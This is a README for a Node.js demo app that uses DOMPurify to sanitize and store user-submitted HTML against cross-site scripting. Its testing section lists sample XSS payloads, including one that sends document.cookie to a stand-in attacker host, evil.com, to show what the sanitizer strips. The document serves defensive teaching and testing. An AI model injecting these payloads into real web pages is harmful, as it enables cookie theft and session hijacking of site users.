# XSS Sample App - HTML Storage with XSS Protection

A Node.js application that demonstrates proper handling of XSS (Cross-Site Scripting) vulnerabilities when accepting and storing HTML input.

## Features

- ✅ **XSS Protection**: Uses DOMPurify to sanitize HTML input and prevent XSS attacks
- 📝 **HTML Storage**: Accepts HTML content via POST endpoint and stores it in files
- 🔍 **File Management**: View, list, and delete stored HTML files
- 🎨 **Interactive UI**: Beautiful web interface to test the XSS protection
- 📊 **Statistics**: Shows original vs sanitized content size

## Security Implementation

The application uses **DOMPurify** to sanitize all HTML input before storing it. This prevents:

- Script injection (`<script>` tags)
- Event handlers (`onerror`, `onclick`, etc.)
- JavaScript protocols (`javascript:`)
- Dangerous attributes and tags
- Data URIs and other XSS vectors

### Allowed HTML Tags

The app allows safe HTML tags only:

- Text formatting: `p`, `br`, `strong`, `em`, `u`
- Headings: `h1`, `h2`, `h3`, `h4`, `h5`, `h6`
- Lists: `ul`, `ol`, `li`
- Links: `a` (with safe attributes only)
- Containers: `div`, `span`

## Installation

1. Install dependencies:

```bash
npm install
```

## Running the Application

Start the server:

```bash
npm start
```

The server will start on `http://localhost:3000`

## Usage

### Web Interface

1. Open your browser and navigate to `http://localhost:3000`
2. Enter a filename and HTML content
3. Try pasting malicious XSS payloads (examples provided in the UI)
4. Click "Store HTML (Protected)" to save the content
5. View statistics showing how many bytes were removed during sanitization
6. View stored files by clicking the "View" button

### API Endpoints

#### Store HTML Content

```bash
POST /api/store-html
Content-Type: application/json

{
  "filename": "my-document",
  "html": "<h1>Hello World</h1><script>alert('XSS')</script>"
}
```

Response:

```json
{
  "success": true,
  "message": "HTML content stored successfully",
  "filename": "my-document.html",
  "filepath": "/path/to/data/my-document.html",
  "originalLength": 58,
  "sanitizedLength": 22,
  "bytesRemoved": 36
}
```

#### List Stored Files

```bash
GET /api/files
```

Response:

```json
{
  "success": true,
  "files": ["my-document.html", "test.html"],
  "count": 2
}
```

#### View a Stored File

```bash
GET /api/view/:filename
```

Returns the sanitized HTML file.

#### Delete a Stored File

```bash
DELETE /api/delete/:filename
```

Response:

```json
{
  "success": true,
  "message": "File deleted successfully"
}
```

## Testing XSS Protection

Try these malicious payloads in the web interface - they will all be sanitized:

1. **Script Injection**:

   ```html
   <script>
     alert("XSS Attack!");
   </script>
   ```

2. **Event Handler**:

   ```html
   <img src="x" onerror="alert('XSS')" />
   ```

3. **JavaScript Protocol**:

   ```html
   <a href="javascript:alert('XSS')">Click me</a>
   ```

4. **Inline Event**:

   ```html
   <div onclick="alert('XSS')">Click here</div>
   ```

5. **Complex Attack**:
   ```html
   <img
     src="x"
     onerror="this.src='http://evil.com/steal?cookie='+document.cookie"
   />
   ```

All these attacks will be neutralized, and you'll see in the statistics how many bytes were removed.

## Project Structure

```
xss_sample/
├── server.js           # Main Express server with API endpoints
├── package.json        # Dependencies and scripts
├── public/
│   └── index.html      # Web interface for testing
└── data/               # Directory where HTML files are stored (created automatically)
```

## Dependencies

- **express**: Web framework
- **body-parser**: Parse incoming request bodies
- **dompurify**: HTML sanitization library
- **jsdom**: JavaScript implementation of DOM for Node.js
- **fs-extra**: Enhanced file system operations

## How XSS Protection Works

1. **Input Validation**: Server validates that HTML and filename are provided
2. **Sanitization**: DOMPurify processes the HTML and removes all potentially dangerous content
3. **Safe Storage**: Only sanitized HTML is stored to the file system
4. **Secure Output**: Stored files include a visual indicator that content has been sanitized

## Key Security Features

- ✅ Input validation on all endpoints
- ✅ HTML sanitization using DOMPurify
- ✅ Safe filename handling (removes special characters)
- ✅ Path traversal protection
- ✅ Restricted HTML tag and attribute whitelist
- ✅ No inline JavaScript execution allowed
- ✅ Statistics showing what was removed during sanitization

## License

ISC
